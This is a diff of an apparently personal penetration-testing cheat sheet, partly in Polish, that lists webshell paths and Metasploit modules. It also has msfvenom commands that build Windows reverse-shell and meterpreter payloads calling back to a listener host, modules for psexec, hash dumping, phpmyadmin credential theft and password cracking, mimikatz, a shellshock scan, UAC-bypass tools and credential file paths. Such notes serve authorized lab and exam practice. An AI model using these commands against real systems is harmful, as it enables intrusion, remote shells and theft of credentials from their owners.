@@ -102,38 +102,67 @@ ProcessMaker HTTP -  exploit/multi/http/process_maker_exec
 
 
 webshells, reverse shells:
+
 /usr/share/webshells/php/php-backdoor.php
+
 msfvenom -p windows/shell/reverse_tcp LHOST=ip LPORT=1234 -f asp > shell.aspx
+
 /usr/share/webshells/php/php-reverse-shell.php
+
 /usr/share/webshells/asp/webshell.asp
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe
+
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -f exe > payload.exe
 
 
+
 usefull:
+
 post/multi/manage/shell_to_meterpreter
+
 TCP port 5985 5986 (HTTPS) wsman (słowo klucz) - Windows Remote   Management Protocol - auxiliary/scanner/winrm/winrm_login
+
 mimikatz = KIWI | meterpreter>load kiwi
+
 testowanie dziwnych portów (np. takich ze znakiem zapytania?) - nc -nv ip <port>
+
 Microsoft IIS = asp lub aspx
+
 Apache i Linux = php
+
 exploit/windows/misc/hta_server
+
 https://github.com/411Hall/JAWS - windows wnumeration
+
 https://github.com/rebootuser/LinEnum - linux enumeration
+
 auxiliary/analyze/crack_windows
+
 post/linux/gather/hashdump
+
 auxiliary/analyze/crack_linux
+
 auxiliary/scanner/rdp/rdp_scanner - RDP może być na innym niż domyślnym porcie
+
 nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 192.242.220.3 (JAK JEST CGI FILE)
+
 exploit/windows/smb/psexec
+
 post/linux/gather/phpmyadmin_credsteal # może znaleźć hasło do roota
+
 https://github.com/hfiref0x/UACME
 
 
+
 interesting paths:
+
 /wamp/www/wordpress/wp-config.php
+
 C:\wamp\alias\phpmyadmin.conf
+
 /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+
 
 
 privilege esc:
